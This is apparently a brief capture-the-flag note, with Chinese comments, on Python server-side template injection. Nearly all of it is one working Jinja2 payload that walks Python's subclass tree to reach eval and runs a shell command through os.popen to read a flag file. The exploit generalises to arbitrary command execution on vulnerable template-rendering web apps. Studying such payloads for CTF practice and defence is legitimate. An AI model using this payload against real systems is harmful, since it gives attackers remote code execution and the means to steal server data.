
# Web_python_template_injection


* python模板植入
``` 
{% for c in [].__class__.__base__.__subclasses__() %}

{% if c.__name__ == 'catch_warnings' %}

  {% for b in c.__init__.__globals__.values() %}  

  {% if b.__class__ == {}.__class__ %}         //遍历基类 找到eval函数

    {% if 'eval' in b.keys() %}    //找到了

      {{ b['eval']('__import__("os").popen("cat fl4g").read()') }} 

    {% endif %}

  {% endif %}

  {% endfor %}

{% endif %}

{% endfor %}
```
